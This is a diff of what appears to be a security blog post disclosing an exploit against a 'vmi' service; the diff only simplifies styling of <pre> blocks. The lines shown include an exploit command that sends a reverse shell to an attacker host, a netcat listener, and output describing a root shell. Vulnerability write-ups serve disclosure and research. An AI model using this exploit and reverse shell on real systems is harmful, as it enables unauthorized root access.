@@ -99,7 +99,7 @@ def handle_certificate(self, pfx_file, password):
 
 I wrote the initial proof-of-concept using Python. You can get the code from [here]({{site.url}}assets/exploit_vmi.py).
 
-<pre style="background-color:black;width: auto; height: auto; word-wrap: break-word; white-space: pre-wrap; overflow:auto; overflow-y: hidden; color:white;font-family:'monospace';">
+<pre>
 python exploit.py --rhost vmi --rport 8443 --lhost attacker --lport 4444 --username admin --password admin
 [+] Login to https://vmi:8443/
 [+] Successfully logged in.
@@ -110,7 +110,7 @@ python exploit.py --rhost vmi --rport 8443 --lhost attacker --lport 4444 --usern
 
 And here goes your root shell :)
 
-<pre style="background-color:black;width: auto; height: auto; word-wrap: break-word; white-space: pre-wrap; overflow:auto; overflow-y: hidden; color:white;font-family:'monospace';">
+<pre>
 nc -lvp 4444
 listening on [any] 4444 ...
 bash: no job control in this shell
